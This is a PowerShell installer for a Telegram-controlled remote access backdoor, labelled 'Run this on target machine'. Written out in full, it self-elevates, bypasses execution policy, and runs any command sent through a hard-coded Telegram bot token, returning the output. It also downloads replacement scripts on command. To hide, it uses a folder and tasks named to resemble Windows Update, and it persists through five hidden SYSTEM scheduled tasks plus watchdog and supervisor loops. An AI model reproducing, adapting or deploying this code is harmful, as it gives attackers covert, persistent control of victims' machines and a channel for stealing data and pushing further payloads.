# Run this on target machine to deploy the bot
$installPath = "$env:ProgramData\WindowUpdate\sys_tg.ps1"
$watchdogPath = "$env:ProgramData\WindowUpdate\watchdog.ps1"
$supervisorPath = "$env:ProgramData\WindowUpdate\supervisor.ps1"
$taskPath = "\WindowUpdate\"

# Create directory if it doesn't exist
if (-not (Test-Path "$env:ProgramData\WindowUpdate")) {
    New-Item -ItemType Directory -Path "$env:ProgramData\WindowUpdate" -Force | Out-Null
}

$script = @'
# ===== AUTO ELEVATE =====
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# ===== CONFIG =====
$BOT_TOKEN = "8719744854:AAHHKjeL-UOc5LxMIKmeY53KU1HOmIJH9K4"
$CHAT_ID = "380330092"
$ADMIN_CHAT_IDS = @("347753116", "7303070402" , "6716357143", "380330092")

$lastUpdate = 0
$updateMode = $false
$computerName = $env:COMPUTERNAME
$script:processedCommands = @{}

# ===== MUTEX FOR SINGLE INSTANCE =====
$mutex = New-Object System.Threading.Mutex($false, "Global\TGBot_$computerName")
if (-not $mutex.WaitOne(0, $false)) {
    Write-Host "Another instance is already running"
    exit
}

# ===== NETWORK WAIT =====
function Wait-ForNetwork {
    $attempts = 0
    while ($attempts -lt 12) {
        try {
            $null = Invoke-RestMethod -Uri "https://api.telegram.org" -TimeoutSec 5
            return $true
        } catch {
            $attempts++
            Start-Sleep -Seconds 5
        }
    }
    return $false
}

# Wait for network before starting
if (-not (Wait-ForNetwork)) {
    Write-Host "Network not available, exiting"
    exit
}

function Send($text, $replyToMessageId = $null) {
    $body = @{
        chat_id = $CHAT_ID
        text = "[$computerName]`n$text"
    }
    if ($replyToMessageId) {
        $body.reply_to_message_id = $replyToMessageId
    }
    
    $retry = 0
    do {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -Method Post -Body $body -TimeoutSec 10 -ErrorAction Stop | Out-Null
            return
        } catch {
            $retry++
            if ($retry -lt 3) { Start-Sleep -Seconds 2 }
        }
    } while ($retry -lt 3)
    
    Write-Host "Failed to send message after 3 attempts"
}

function GetUpdates {
    try {
        $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$lastUpdate&timeout=25" -TimeoutSec 30
        return $response
    } catch {
        return $null
    }
}

function DownloadFile($file_id, $savePath) {
    try {
        $file = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getFile?file_id=$file_id"
        $filePath = $file.result.file_path
        $url = "https://api.telegram.org/file/bot$BOT_TOKEN/$filePath"
        Invoke-WebRequest $url -OutFile $savePath
        return $true
    } catch {
        return $false
    }
}

function IsCommandForMe($commandText) {
    if ($commandText -match "^@(\S+)\s+(.+)$") {
        $target = $matches[1]
        $cmd = $matches[2]
        
        if ($target -eq $computerName -or $target -eq "all" -or $target -eq "broadcast" -or $target -eq "everyone") {
            return $cmd
        }
        return $null
    }
    return $commandText
}

function IsCommandProcessed($messageId, $commandText) {
    $key = "$messageId`_$commandText"
    if ($script:processedCommands.ContainsKey($key)) {
        return $true
    }
    $script:processedCommands[$key] = $true
    
    if ($script:processedCommands.Count -gt 100) {
        $keysToRemove = $script:processedCommands.Keys | Select-Object -First 50
        foreach ($k in $keysToRemove) {
            $script:processedCommands.Remove($k)
        }
    }
    return $false
}

# ===== AUTO ACCEPT POWERSHELL POLICIES =====
function Set-PowerShellPolicy {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction SilentlyContinue
        
        try {
            Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force -ErrorAction SilentlyContinue
        } catch {}
        
        $env:POWERSHELL_TELEMETRY_OPTOUT = 1
        $env:POWERSHELL_UPDATECHECK = 'Off'
        
        $PSDefaultParameterValues['*:Confirm'] = $false
        $PSDefaultParameterValues['*:Force'] = $true
    } catch {}
}

Set-PowerShellPolicy

# ===== RANDOM DELAY TO PREVENT THUNDERING HERD =====
$randomDelay = Get-Random -Minimum 1 -Maximum 5
Start-Sleep -Seconds $randomDelay

Send "Bot started on $computerName"

$consecutiveErrors = 0

while ($true) {
    try {
        $updates = GetUpdates

        if ($updates -and $updates.result) {
            $consecutiveErrors = 0
            
            foreach ($u in $updates.result) {
                $lastUpdate = $u.update_id + 1

                if ($u.message.chat.id -ne $CHAT_ID) { continue }

                $messageId = $u.message.message_id

                # ===== COMMAND =====
                if ($u.message.text) {
                    $fullCommand = $u.message.text
                    
                    $actualCommand = IsCommandForMe $fullCommand
                    
                    if ($actualCommand -eq $null) {
                        continue
                    }

                    if (IsCommandProcessed $messageId $actualCommand) {
                        Write-Host "Command already processed"
                        continue
                    }

                    # Handle special commands
                    if ($actualCommand -eq "/update") {
                        $updateMode = $true
                        Send "Update mode activated. Send new .ps1 file." $messageId
                        continue
                    }

                    if ($actualCommand -eq "/status") {
                        $processes = (Get-Process).Count
                        $uptime = (Get-Date) - (Get-Process -Id $PID).StartTime
                        $os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
                        $status = "Status Report`n" + `
                                  "Computer: $computerName`n" + `
                                  "OS: $os`n" + `
                                  "Uptime: $($uptime.ToString('hh\h mm\m ss\s'))`n" + `
                                  "Processes: $processes`n" + `
                                  "Memory: $([math]::Round((Get-Process -Id $PID).WorkingSet64/1MB, 2)) MB"
                        Send $status $messageId
                        continue
                    }

                    if ($actualCommand -eq "/test") {
                        Send "Test OK - $computerName is alive!`nTime: $(Get-Date -Format 'HH:mm:ss')" $messageId
                        continue
                    }
                    
                    if ($actualCommand -eq "/ping") {
                        Send "Pong from $computerName" $messageId
                        continue
                    }
                    
                    if ($actualCommand -eq "/who") {
                        $user = whoami 2>&1 | Out-String
                        Send "Current user: $user" $messageId
                        continue
                    }

                    # Execute the actual command
                    Send "Executing command..." $messageId
                    
                    try {
                        # Capture all output streams
                        $out = & {
                            $ErrorActionPreference = 'Continue'
                            Invoke-Expression $actualCommand 2>&1
                        } | Out-String -Width 4096
                        
                        if ([string]::IsNullOrWhiteSpace($out)) {
                            $out = "Command executed successfully (no output)"
                        }
                        
                        # If still empty for simple commands, try temp file method
                        if ($out -eq "Command executed successfully (no output)" -and $actualCommand -match "whoami|hostname|dir|ls|ipconfig|systeminfo") {
                            $tmpOut = "$env:TEMP\cmdout_$([Guid]::NewGuid()).txt"
                            Start-Process powershell -ArgumentList "-NoProfile -Command `"$actualCommand > '$tmpOut' 2>&1; exit`"" -Wait -WindowStyle Hidden
                            if (Test-Path $tmpOut) {
                                $fileOut = Get-Content $tmpOut -Raw -ErrorAction SilentlyContinue
                                if ($fileOut) {
                                    $out = $fileOut
                                }
                                Remove-Item $tmpOut -Force -ErrorAction SilentlyContinue
                            }
                        }
                        
                    } catch {
                        $out = "Error: $($_.Exception.Message)"
                    }

                    # Truncate if too long
                    $maxLength = 3800
                    if ($out.Length -gt $maxLength) {
                        $out = $out.Substring(0, $maxLength) + "`n... (truncated)"
                    }
                    
                    Send $out $messageId
                }

                # ===== UPDATE =====
                if ($updateMode -and $u.message.document) {
                    $fileName = $u.message.document.file_name

                    if ($fileName -like "*.ps1") {
                        $newPath = "$env:TEMP\update_$([Guid]::NewGuid()).ps1"

                        if (DownloadFile $u.message.document.file_id $newPath) {
                            Send "Updating $computerName..." $messageId

                            $valid = $true
                            try {
                                $null = Get-Command $newPath -ErrorAction Stop
                            } catch {
                                $valid = $false
                                Send "Invalid script file" $messageId
                            }

                            if ($valid) {
                                Copy-Item $PSCommandPath "$PSCommandPath.backup" -Force -ErrorAction SilentlyContinue
                                Copy-Item $newPath $PSCommandPath -Force
                                Remove-Item $newPath -Force -ErrorAction SilentlyContinue
                                
                                Send "$computerName updated. Restarting..." $messageId
                                Start-Sleep 2
                                
                                Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
                                $mutex.ReleaseMutex()
                                exit
                            }
                        } else {
                            Send "Failed to download file" $messageId
                        }
                    } else {
                        Send "Please send a .ps1 file" $messageId
                    }
                    
                    $updateMode = $false
                }
            }
        }
    } catch {
        $consecutiveErrors++
        Write-Host "Error in main loop: $_"
        
        $sleepTime = if ($consecutiveErrors -gt 5) { 30 } else { 10 }
        Start-Sleep $sleepTime
    }

    # Small random delay to prevent all computers from polling simultaneously
    $jitter = Get-Random -Minimum 1 -Maximum 3
    Start-Sleep $jitter
}

$mutex.ReleaseMutex()
'@

# Create watchdog script
$watchdogScript = @'
# Watchdog script to ensure main bot is running
$installPath = "$env:ProgramData\WindowUpdate\sys_tg.ps1"
$computerName = $env:COMPUTERNAME

while ($true) {
    $processes = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*sys_tg.ps1*" }
    
    if (-not $processes) {
        # Start the main bot
        Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`"" -Verb RunAs
    }
    
    Start-Sleep -Seconds 60
}
'@

# Create supervisor script
$supervisorScript = @'
# Supervisor script to monitor watchdog
$watchdogPath = "$env:ProgramData\WindowUpdate\watchdog.ps1"

while ($true) {
    $watchdogProcess = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*watchdog.ps1*" }
    
    if (-not $watchdogProcess) {
        # Start the watchdog
        Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`"" -Verb RunAs
    }
    
    Start-Sleep -Seconds 120
}
'@

# Save scripts
Set-Content -Path $installPath -Value $script -Force
Set-Content -Path $watchdogPath -Value $watchdogScript -Force
Set-Content -Path $supervisorPath -Value $supervisorScript -Force

# Stop any existing instances
Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.CommandLine -like "*sys_tg.ps1*"} | Stop-Process -Force -ErrorAction SilentlyContinue

# Remove old scheduled task if exists
$taskName1 = "WindowUpdate1"
$taskName2 = "WindowUpdate1_PS"
$taskName3 = "WindowUpdate2"
$taskName4 = "WindowUpdate3"
$taskName5 = "WindowUpdate4"

Unregister-ScheduledTask -TaskName $taskName1 -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName $taskName2 -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName $taskName3 -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName $taskName4 -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName $taskName5 -Confirm:$false -ErrorAction SilentlyContinue

# Create scheduled tasks for persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 999 -ExecutionTimeLimit (New-TimeSpan -Days 0) -MultipleInstances IgnoreNew
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# 1. WindowUpdate1 - Startup (Main Bot) - INFINITE EXECUTION TIME
$trigger.StartBoundary = [datetime]::Now.ToString('yyyy-MM-ddTHH:mm:ss')
Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate1" -Description "Runs Telegram bot at startup" -User "SYSTEM" -RunLevel Highest -Force | Out-Null

# 2. WindowUpdate1_PS - User Login (Main Bot) - INFINITE EXECUTION TIME
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "NT AUTHORITY\SYSTEM"
$trigger.StartBoundary = [datetime]::Now.ToString('yyyy-MM-ddTHH:mm:ss')
Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate1_PS" -Description "Runs Telegram bot at user login" -User "SYSTEM" -RunLevel Highest -Force | Out-Null

# 3. WindowUpdate2 - Every 15 Minutes (Main Bot) - INFINITE EXECUTION TIME
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 3650)
Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate2" -Description "Runs Telegram bot every 15 minutes" -User "SYSTEM" -RunLevel Highest -Force | Out-Null

# 4. WindowUpdate3 - Watchdog (Startup) - INFINITE EXECUTION TIME
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$trigger.StartBoundary = [datetime]::Now.ToString('yyyy-MM-ddTHH:mm:ss')
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 999 -ExecutionTimeLimit (New-TimeSpan -Days 0)
Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate3" -Description "Runs watchdog for Telegram bot" -User "SYSTEM" -RunLevel Highest -Force | Out-Null

# 5. WindowUpdate4 - Supervisor (Startup) - INFINITE EXECUTION TIME
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$supervisorPath`""
Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate4" -Description "Runs supervisor for watchdog" -User "SYSTEM" -RunLevel Highest -Force | Out-Null

# ===== START ALL TASKS IMMEDIATELY =====
Start-ScheduledTask -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate1" -ErrorAction SilentlyContinue
Start-ScheduledTask -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate1_PS" -ErrorAction SilentlyContinue
Start-ScheduledTask -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate2" -ErrorAction SilentlyContinue
Start-ScheduledTask -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate3" -ErrorAction SilentlyContinue
Start-ScheduledTask -TaskPath "\WindowUpdate\" -TaskName "WindowUpdate4" -ErrorAction SilentlyContinue

# Run it now
Start-Process powershell "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`"" -Verb RunAs

Write-Host "Bot deployed and started on $env:COMPUTERNAME" -ForegroundColor Green
Write-Host "Installation path: $installPath" -ForegroundColor Yellow
Write-Host "Watchdog path: $watchdogPath" -ForegroundColor Yellow
Write-Host "Supervisor path: $supervisorPath" -ForegroundColor Yellow